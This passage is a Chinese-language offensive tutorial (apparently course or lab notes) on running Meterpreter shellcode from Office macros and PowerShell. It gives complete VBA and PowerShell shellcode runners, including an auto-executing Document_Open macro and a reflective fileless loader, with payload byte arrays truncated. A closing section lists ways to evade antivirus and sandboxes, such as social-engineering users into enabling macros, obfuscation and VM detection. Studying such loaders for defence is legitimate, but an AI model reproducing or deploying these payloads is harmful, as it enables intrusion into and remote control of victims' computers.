### 代码分析题答案

**题目 1**：
1. 功能：在内存中分配空间，复制 Shellcode，创建线程执行
2. &H3000 = MEM_COMMIT | MEM_RESERVE（分配并提交内存）；&H40 = PAGE_EXECUTE_READWRITE（可执行可读可写）
3. VBA 的 Array 是 Variant 类型，需要逐字节复制到连续内存
4. 局限性：Shellcode 嵌入文档，容易被静态检测；关闭 Word 后 Shell 会断开

**题目 2**：
1. 作用：动态查找指定 DLL 中指定函数的内存地址
2. GlobalAssemblyCache 过滤确保只查找系统程序集，避免查找用户程序集
3. System.dll 中有多个 GetProcAddress 重载，需要获取所有并选择正确的一个
4. 优势：完全在内存中执行，不会写入临时文件，更难被检测

### 6.1 VBA Shellcode 执行器

```vba
' ============================================
' VBA Shellcode 执行器
' 在 Word 内存中执行 Shellcode
' ============================================

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" ( _
    ByVal lpAddress As LongPtr, _
    ByVal dwSize As Long, _
    ByVal flAllocationType As Long, _
    ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" ( _
    ByVal lDestination As LongPtr, _
    ByRef sSource As Any, _
    ByVal lLength As Long) As LongPtr

Private Declare PtrSafe Function CreateThread Lib "KERNEL32" ( _
    ByVal SecurityAttributes As Long, _
    ByVal StackSize As Long, _
    ByVal StartFunction As LongPtr, _
    ThreadParameter As LongPtr, _
    ByVal CreateFlags As Long, _
    ByRef ThreadId As Long) As LongPtr

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr

    ' Shellcode (msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 EXITFUNC=thread -f vbapplication)
    buf = Array(252,72,131,228,240,232,204,0,0,0,65,81,65,80,52,72,49,210,51,...)

    ' 分配内存
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    ' 复制 Shellcode
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    ' 创建线程执行
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

### 6.3 PowerShell Shellcode 执行器 (Add-Type)

```powershell
# ============================================
# PowerShell Shellcode 执行器 (Add-Type 版本)
# 使用 P/Invoke 调用 Win32 API
# ============================================

$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@

Add-Type $Kernel32

# Shellcode (msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 EXITFUNC=thread -f ps1)
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0...

$size = $buf.Length

# 分配内存
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0, $size, 0x3000, 0x40)

# 复制 Shellcode
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

# 创建线程
$thandle = [Kernel32]::CreateThread(0, 0, $addr, 0, 0, 0)

# 等待线程
[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

### 6.4 PowerShell 反射 Shellcode 执行器

```powershell
# ============================================
# PowerShell 反射 Shellcode 执行器
# 完全在内存中执行，无文件落地
# ============================================

# 函数：查找 API 地址
function LookupFunc {
    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')
        }).GetType('Microsoft.Win32.UnsafeNativeMethods')

    $tmp = @()
    $assem.GetMethods() | ForEach-Object { If($_.Name -eq "GetProcAddress") { $tmp += $_ } }

    return $tmp[0].Invoke($null, @(
        ($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)),
        $functionName
    ))
}

# 函数：创建委托类型
function GetDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.
        DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
        DefineDynamicModule('InMemoryModule', $false).
        DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
        [System.MulticastDelegate])

    $type.DefineConstructor('RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard, $func).
        SetImplementationFlags('Runtime, Managed')

    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
        SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()
}

# ========== 主程序 ==========

# Shellcode
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0...

$size = $buf.Length

# 分配内存
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll VirtualAlloc),
    (GetDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
).Invoke([IntPtr]::Zero, $size, 0x3000, 0x40)

# 复制 Shellcode
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $size)

# 创建线程
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll CreateThread),
    (GetDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)

# 等待线程
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (LookupFunc kernel32.dll WaitForSingleObject),
    (GetDelegateType @([IntPtr], [Int32]) ([Int]))
).Invoke($hThread, 0xFFFFFFFF)
```

## 七、实战经验总结

### 7.1 技术选择建议

```
选择建议：

需要快速测试：
├── VBA 内嵌 Shellcode (最简单)
└── PowerShell Add-Type (较简单)

需要绕过检测：
├── PowerShell 反射 (无文件落地)
├── 分离 Payload (下载执行)
└── 混淆代码

需要持久化：
├── 使用 PowerShell 子进程
├── 添加 WaitForSingleObject
└── 考虑进程迁移
```

### 7.2 常见问题

| 问题 | 原因 | 解决方案 |
|------|------|----------|
| Shell 立即断开 | PowerShell 进程退出 | 添加 WaitForSingleObject |
| 宏被阻止 | Office 安全设置 | 社会工程诱导启用 |
| 下载失败 | 代理问题 | 使用代理感知下载摇篮 |
| 被杀软检测 | 签名匹配 | 使用反射技术或混淆 |
| 32/64 位不匹配 | 架构错误 | 检查 Office 和 Shellcode 架构 |

### 7.3 检测规避建议

```
规避策略：
1. 使用反射技术避免 Add-Type 文件落地
2. 分离 Payload，不在文档中嵌入 Shellcode
3. 使用 HTTPS 加密通信
4. 添加延迟执行绕过沙箱
5. 检测虚拟机/沙箱环境
6. 混淆代码和字符串
7. 使用合法的 User-Agent
```
